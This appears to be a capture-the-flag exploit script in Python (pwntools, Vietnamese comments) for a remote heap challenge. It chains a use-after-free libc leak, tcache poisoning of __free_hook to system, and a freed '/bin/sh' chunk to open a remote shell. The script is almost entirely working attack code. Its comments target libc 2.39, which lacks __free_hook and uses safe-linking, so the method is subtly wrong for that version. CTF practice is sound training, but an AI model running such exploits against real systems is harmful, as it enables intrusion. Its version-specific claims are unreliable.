from pwn import *

# --- Setup ---
# Chọn binary và libc
elf = context.binary = ELF('./chall', checksec=False)
libc = ELF('./libc.so.6', checksec=False)

# Kết nối (local hoặc remote)
# p = process()
# gdb.attach(p) # Để debug
p = remote('chal1.fwectf.com', 8010) # Thay đổi host và port nếu cần

# --- Helper functions cho menu ---
def allocate(idx, size, data):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'Index: ', str(idx).encode())
    p.sendlineafter(b'Size: ', str(size).encode())
    p.sendafter(b'Data: ', data)

def free(idx):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'Index: ', str(idx).encode())

def edit(idx, data):
    p.sendlineafter(b'> ', b'3')
    p.sendlineafter(b'Index: ', str(idx).encode())
    p.sendafter(b'Data: ', data)

def show(idx):
    p.sendlineafter(b'> ', b'4')
    p.sendlineafter(b'Index: ', str(idx).encode())

# --- Bước 1: Leak địa chỉ Libc ---
log.info("Step 1: Leaking libc address")

# Cấp phát chunk lớn (vào unsorted bin) và chunk guard
allocate(0, 0x428, b'A'*8) # Chunk 0: unsorted bin victim
allocate(1, 0x28, b'B'*8)  # Chunk 1: guard chunk

# Free chunk 0 để đưa vào unsorted bin
free(0)

# Dùng UAF để show chunk 0 và leak địa chỉ trong main_arena
show(0)
p.recvuntil(b'Data: ')
leak_data = p.recv(8)
leaked_addr = u64(leak_data)

# Tính địa chỉ base của libc
# Offset này có thể thay đổi giữa các phiên bản libc. 
# Với libc 2.39 (Ubuntu 24.04), offset từ leak đến base là 0x219090
# Hoặc có thể tính bằng: leaked_addr - (libc.symbols['main_arena'] + 0x60)
# Nhưng cách tính từ một symbol cố định sẽ ổn định hơn.
libc_base = leaked_addr - 0x219090 # Offset này cần xác định chính xác cho libc được cung cấp
libc.address = libc_base
log.success(f"Libc leak: {hex(leaked_addr)}")
log.success(f"Libc base: {hex(libc.address)}")


# --- Bước 2: Tcache Poisoning để ghi đè __free_hook ---
log.info("Step 2: Tcache Poisoning")

# Dọn dẹp heap một chút, malloc lại chunk 0
allocate(0, 0x428, b'cleanup')

# Cấp phát 2 chunk cùng tcache size (0x30)
allocate(2, 0x28, b'C'*8)
allocate(3, 0x28, b'D'*8)

# Free chúng để đưa vào tcache bin (thứ tự: 3 -> 2)
free(3)
free(2)

# Lấy địa chỉ __free_hook và system
free_hook_addr = libc.symbols['__free_hook']
system_addr = libc.symbols['system']
log.info(f"__free_hook address: {hex(free_hook_addr)}")
log.info(f"system address: {hex(system_addr)}")

# Dùng UAF (edit on chunk 2) để ghi đè fd của nó -> Tcache Poisoning
# Làm cho con trỏ fd của chunk 2 trỏ đến __free_hook
edit(2, p64(free_hook_addr))

# Cấp phát 2 lần để lấy con trỏ đến __free_hook
allocate(4, 0x28, b'E'*8) # Lần này malloc sẽ trả về chunk 2 cũ
allocate(5, 0x28, b'F'*8) # Lần này malloc sẽ trả về con trỏ đến __free_hook!

# Bây giờ chunks[5] trỏ đến __free_hook. Ghi đè nó bằng địa chỉ của system
log.info("Overwriting __free_hook with system address")
edit(5, p64(system_addr))


# --- Bước 3: Lấy Shell ---
log.info("Step 3: Spawning a shell")

# Cấp phát một chunk và ghi "/bin/sh" vào đó
allocate(6, 0x18, b'/bin/sh\x00')

# Free chunk này để trigger __free_hook("/bin/sh") => system("/bin/sh")
free(6)

# Tận hưởng shell
p.interactive()